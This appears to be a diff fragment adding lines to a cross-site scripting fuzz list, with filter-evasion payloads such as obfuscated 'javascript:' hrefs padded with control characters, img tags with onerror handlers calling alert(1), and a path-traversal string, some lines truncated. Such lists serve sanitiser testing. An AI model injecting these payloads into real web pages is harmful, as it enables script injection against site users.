@@ -1,0 +1,8 @@
+javascripÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿt:javascript:alert(1)" id="fuzzelement1">test</a>
+t</a>
+<a href="\x12javascript:javascript:alert(1>test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
+`"'><img src=xxx:xpt./../../../../../>
+"
